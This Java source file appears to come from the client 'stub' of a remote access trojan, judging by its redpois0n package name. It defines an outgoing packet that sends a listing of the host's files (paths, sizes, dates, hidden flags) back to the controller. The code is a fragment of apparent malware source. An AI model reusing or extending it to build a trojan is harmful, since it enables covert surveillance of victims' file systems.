package com.redpois0n.stub.stub.packets.outgoing;

import java.io.DataOutputStream;
import java.io.File;
import java.util.Calendar;
import java.util.Date;

import com.redpois0n.common.io.StringWriter;

public class Packet19ListFiles extends AbstractOutgoingPacket {

	private File[] files;

	public Packet19ListFiles(File[] files) {
		this.files = files;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		dos.writeInt(files.length);
		
		for (int i = 0; i < files.length; i++) {
			File file = files[i];
			if (file.isDirectory()) {
				sw.writeLine(file.getAbsolutePath());
				dos.writeBoolean(true);
				dos.writeBoolean(file.isHidden());
			} else {
				sw.writeLine(file.getAbsolutePath());
				dos.writeBoolean(false);
				sw.writeLine(getDate(file.lastModified()));
				dos.writeLong(file.length());
				dos.writeBoolean(file.isHidden());
			}
		}

	}

	@Override
	public byte getPacketId() {
		return 19;
	}

	public static String getDate(long date) {
		Calendar cal = Calendar.getInstance();
		cal.setTime(new Date(date));
		return (cal.get(Calendar.MONTH) + 1) + "/" + cal.get(Calendar.DAY_OF_MONTH) + "/" + cal.get(Calendar.YEAR) + " " + (00 + cal.get(Calendar.HOUR_OF_DAY)) + ":" + cal.get(Calendar.MINUTE);
	}

}
